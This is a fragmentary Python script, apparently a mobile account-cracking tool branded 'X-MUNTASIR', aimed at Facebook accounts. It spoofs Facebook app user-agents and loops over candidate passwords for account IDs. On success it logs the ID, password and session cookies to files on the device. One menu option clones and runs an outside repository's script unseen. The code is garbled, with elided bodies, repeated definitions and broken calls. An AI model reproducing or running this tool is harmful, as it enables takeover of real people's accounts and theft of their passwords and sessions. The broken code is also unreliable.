...
def __banner___():
    print(f"""\033[1;32m
 ___     _    _     ___                  _   _  _   _  _____  _____  ___    _  ___   
(  _)   ( )  ( )   (_  )         /'\_/`\( ) ( )( ) ( )(_   _)(  _  )(  _`\ (_)|  _`\ 
| |     `\`\/'/'     | |         |     || | | || `\| |  | |  | (_) || (_(_)| || (_) )
| |       >  <       | |         | (_) || | | || , ` |  | |  |  _  |`\__ \ | || ,  / 
| |_     /'/\`\     _| |         | | | || (_) || |`\ |  | |  | | | |( )_) || || |\ \ 
(___)   (_)  (_)   (___)         (_) (_)(_____)(_) (_)  (_)  (_) (_)`\____)(_)(_) (_)
                                                                                     
                                                                                     
    
\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ┏━━━━━━━━━━━━━━━━━━━━━━┓
  ┃ x-muntasir@       ┃  whymuntasir@android-   
  ┣━━━━━━━━━━━━━━━━━━━━━━┫
  ┃                      ┃  Android 
  ┃          •_•         ┃  os     Android 
  ┃          oo|         ┃  owner:   Muntasir
  ...
  ┗━━━━━━━━━━━━━━━━━━━━━━┛  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━    
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92m[✓]FACEBOOK   :  WHY MUNTASIR        
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92m[✓]GITHUB     :  Xmuntasir69o                          
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92m[✓]VERSIONS   :  \033[1;37m[1.0]                   
\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def main():
   ...
   ## print(f"\033[1;37m[\033[1;92m1\033[1;37m] \033[1;92mFILE CRACKING ")
    ...
    if arifin in ['4','01','A','a']:
        ...
        os.system('cd && git clone --depth=1 https://github.com/ARIFIN-212/RANDOM')
        os.system('cd && cd RANDOM ;python TRIAL.py')
...
"""def uaa():
    ...
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Davik/5.5.0 (Android 11.1.2) [FBAN/FBKS;FBAV/654.8.3.953;FBBV/LXC7OXG8W;FBDM/{density=2.3,width=573,height=788};FBLC/fr_FR;FBRV/383732973;FBCR/Mobilink;FBMF/apple;FBBD/google;FBPN/com.instagram.android;FBDV/6ILYDIW;FBSV/6;FBOP/97;FBBK/4]'
    return ua"""
def uaa():
    and_vers = random.randint(4,5,12)
    and_mod = random.choice(android_models)
    ...
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = "[FBAN/FB4A;FBAV/306.0.0.2.167;FBBV/824515681;FBDM/{density=3.3,width=1080,height=1479};FBLC/en_GB;FBRV/949264282;FBCR/Vodafone IN;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy S7;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    return ua
"""def __UBI___():
    ...
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Davik/5.7.8 (Android 5.4.3) [FBAN/FB7R;FBAV/644.7.9.827;FBBV/HDZ4GW5HZ;FBDM/{density=3.0,width=1350,height=1147};FBLC/en_US;FBRV/294967294;FBCR/Jazz;FBMF/xiaomi;FBBD/samsung;FBPN/com.facebook.katana;FBDV/IWWDH9G;FBSV/8;FBOP/68;FBBK/8]','Davik/2.7.2 (Android 8.6.3) [FBAN/FBSN;FBAV/662.9.1.785;FBBV/SVP7SGXZP;FBDM/{density=1.5,width=1281,height=1247};FBLC/de_DE;FBRV/240868517;FBCR/Telenor;FBMF/google;FBBD/huawei;FBPN/com.whatsapp;FBDV/AH6KHXW;FBSV/8;FBOP/38;FBBK/9;]'
    return ua"""
def uaa():
    and_vers = random.randint(4,12)
    and_mod = random.choice(android_models)
    ...
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = "[FBAN/FB4A;FBAV/278.0.0.5.111;FBBV/470569182;FBDM/{density=2.4,width=1080,height=1489};FBLC/en_PK;FBRV/914317667;FBCR/Vodafone IN;FBMF/Lava;FBBD/Lava;FBPN/com.facebook.katana;FBDV/X2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    return ua
ugen=[]
def uaa():
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;92m~[X-MUNTASIR-OK] '+ids+' ~ '+pas+'\033[1;92m')
                #. print(f"\r\33[1;36mCOOKIES=[🐼]: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/X-MUNTASIR-OKS.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/X-MUNTASIR-COOKIE','a').write(kuki+'\n')
                break
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\33[1;92m[FUCKED] '+ids+' • '+pas+'\033[1;92m')
                oks.append(ids)
                open('/sdcard/A-CARCK-CPS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
